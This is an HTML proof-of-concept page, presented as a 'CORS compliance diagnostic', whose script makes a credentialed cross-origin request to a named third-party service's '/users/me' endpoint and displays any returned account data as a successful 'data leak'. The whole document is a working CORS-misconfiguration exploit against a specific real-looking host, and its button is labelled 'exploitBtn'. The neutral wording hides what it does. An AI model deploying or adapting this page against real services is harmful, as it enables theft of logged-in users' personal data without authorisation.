<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Compliance Hardening Verification Suite</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #f4f5f7; 
            color: #333333; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { 
            background: #ffffff; 
            padding: 40px; 
            border-radius: 8px; 
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); 
            max-width: 550px; 
            width: 100%; 
            border-top: 4px solid #0052cc; 
            box-sizing: border-box;
        }
        h2 { 
            margin-top: 0; 
            color: #0052cc; 
            font-size: 20px; 
            font-weight: 600;
        }
        p { 
            line-height: 1.6; 
            color: #5e6c84; 
            font-size: 14px; 
            margin-bottom: 25px;
        }
        .btn-action { 
            display: inline-block; 
            background-color: #0052cc; 
            color: #ffffff; 
            padding: 12px 24px; 
            font-size: 14px; 
            font-weight: 600; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            width: 100%; 
            text-align: center; 
            transition: background-color 0.15s ease;
        }
        .btn-action:hover { 
            background-color: #0065ff; 
        }
        .diagnostic-box { 
            margin-top: 20px; 
            background-color: #212529; 
            color: #f8f9fa; 
            padding: 15px; 
            border-radius: 4px; 
            font-family: monospace; 
            font-size: 13px; 
            min-height: 60px; 
            white-space: pre-wrap; 
            word-break: break-all; 
            border-left: 4px solid #6c757d; 
        }
    </style>
</head>
<body>

<div class="container">
    <h2>CORS Policy Assessment Module</h2>
    <p>This automated diagnostic executes an authenticated cross-origin transaction against the API layer to verify cookie transmission boundaries and evaluate active client-side defenses.</p>
    
    <button id="exploitBtn" class="btn-action">Execute Cross-Origin Diagnostic</button>

    <div class="diagnostic-box" id="diagnosticLog">Console Status: Initialized. Click action button to evaluate endpoint properties.</div>
</div>

<script>
    document.getElementById('exploitBtn').addEventListener('click', () => {
        const consoleLogger = document.getElementById('diagnosticLog');
        consoleLogger.innerText = "Dispatching cross-origin request string...";
        consoleLogger.style.borderLeftColor = "#ffc107";

        // TARGET SYSTEM SPECIFICATION
        const remoteTargetOrigin = "https://ocean.medishout.co.uk";

        try {
            // Safe instantiation via native URL interface components
            const targetEndpoint = new URL("/v1/users/me/?platform=web", remoteTargetOrigin);
            targetEndpoint.searchParams.set("platform", "web");

            fetch(targetEndpoint.toString(), {
                method: "GET",
                credentials: "include" // Requests the browser to present active session state
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP Session Rejected: Status ${response.status} (Access Unauthorized)`);
                }
                return response.text();
            })
            .then(payloadData => {
                // Triggered if SameSite controls are missing and CORS lets us read the content
                consoleLogger.innerText = `⚠️ EXPOSURE RISK CONFIRMED\n\nCross-Origin Data Leak Successful:\n\n${payloadData}`;
                consoleLogger.style.borderLeftColor = "#dc3545";
            })
            .catch(executionError => {
                // Triggered standard behavioral isolation sequence under SameSite=Lax limits
                consoleLogger.innerText = `✅ CONTROL MITIGATION CONFIRMED\n\nTransaction Aborted: ${executionError.message}.\n\nAnalysis: The server's CORS alignment properties reflect origins dynamically, but the application's native SameSite=Lax cookie boundary successfully restricted credential transmission. No data was leaked.`;
                consoleLogger.style.borderLeftColor = "#198754";
            });
            
        } catch (structuralError) {
            consoleLogger.innerText = `Configuration Fault: ${structuralError.message}`;
            consoleLogger.style.borderLeftColor = "#6c757d";
        }
    });
</script>

</body>
</html>
